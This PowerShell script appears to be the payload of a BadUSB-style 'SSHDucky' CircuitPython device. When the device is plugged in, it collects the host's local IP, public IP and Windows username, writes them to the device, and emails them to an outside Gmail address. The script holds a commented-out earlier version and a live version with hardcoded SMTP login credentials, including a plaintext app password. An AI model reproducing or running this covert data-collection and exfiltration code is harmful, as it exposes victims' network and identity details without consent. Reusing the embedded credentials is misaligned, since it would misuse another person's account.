# # Specify the volume label of your CircuitPython device
# $volumeLabel = "CIRCUITPY"

# # Get the drive letter of the CircuitPython device
# $driveLetter = (Get-Volume | Where-Object { $_.FileSystemLabel -eq $volumeLabel }).DriveLetter

# if ($driveLetter) {
#     # CircuitPython device found
#     $directoryPath = "$driveLetter" + ":" + "\SSHDucky\SystemData"
#     $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
#     $fileName = "ip_username_$timestamp.txt"
#     $filePath = Join-Path -Path $directoryPath -ChildPath $fileName

#     # Generate the content to be stored in the file
#     $localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Wi-Fi).IPAddress
#     $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
#     $content = "Local IP: $localIP"
#     $content += "`nPublic IP: $publicIP"
#     $content += "`nUsername: $env:USERNAME"

#     # Create the directory if it doesn't exist
#     if (-not (Test-Path -Path $directoryPath)) {
#         New-Item -Path $directoryPath -ItemType Directory | Out-Null
#     }

#     # Create the file
#     $content | Out-File -FilePath $filePath -Encoding ASCII

#     Write-Host "File created successfully: $filePath"
# }
# else {
#     Write-Host "CircuitPython device not found."
# }

# Specify the volume label of your CircuitPython device
# Specify the volume label of your CircuitPython device
$volumeLabel = "CIRCUITPY"

# Get the drive letter of the CircuitPython device
$driveLetter = (Get-Volume | Where-Object { $_.FileSystemLabel -eq $volumeLabel }).DriveLetter

if ($driveLetter) {
    # CircuitPython device found
    $directoryPath = "$driveLetter" + ":" + "\SSHDucky\SystemData"
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $fileName = "ip_username_$timestamp.txt"
    $filePath = Join-Path -Path $directoryPath -ChildPath $fileName

    # Generate the content to be stored in the file
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Wi-Fi).IPAddress
    $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
    $content = "Local IP: $localIP"
    $content += "`nPublic IP: $publicIP"
    $content += "`nUsername: $env:USERNAME"

    # Create the directory if it doesn't exist
    if (-not (Test-Path -Path $directoryPath)) {
        New-Item -Path $directoryPath -ItemType Directory | Out-Null
    }

    # Create the file
    $content | Out-File -FilePath $filePath -Encoding ASCII

    Write-Host "File created successfully: $filePath"

    # Email configuration
    $smtpServer = "smtp.gmail.com"
    $smtpPort = 587
    $smtpUsername = "johnatom336@gmail.com"
    $smtpPassword = "ygthncnfxnumudwz"
    $sendermail = "johnatom336@gmail.com"
    $recipient = "mail.toxysec@gmail.com"
    $subject = "IP and Username Details"
    $body = "Please find attached IP and username details."

    # Send email with attachment
    $attachment = $filePath
    $mailParams = @{
        SmtpServer = $smtpServer
        Port = $smtpPort
        UseSsl = $true
        Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $smtpUsername, (ConvertTo-SecureString -String $smtpPassword -AsPlainText -Force)
        From = $sendermail
        To = $recipient
        Subject = $subject
        Body = $body
        Attachments = $attachment
    }

    Send-MailMessage @mailParams
    Write-Host "Email sent successfully."
}
else {
    Write-Host "CircuitPython device not found."
}



